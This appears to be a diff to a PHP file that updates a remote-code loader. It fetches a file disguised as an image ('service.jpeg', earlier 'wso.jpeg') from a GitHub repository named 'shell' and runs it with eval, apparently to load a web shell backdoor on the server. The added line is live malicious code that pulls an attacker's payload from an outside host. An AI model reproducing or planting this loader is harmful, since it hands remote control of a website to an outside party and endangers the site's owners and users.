@@ -12,5 +12,5 @@ function get_contents($url){
   return $result;
 }
 
-$a = get_contents('https://raw.githubusercontent.com/ahmdgans/fox/main/wso.jpeg');
+$a = get_contents('https://raw.githubusercontent.com/ahmdgans/shell/main/service.jpeg');
 eval('?>'.$a);
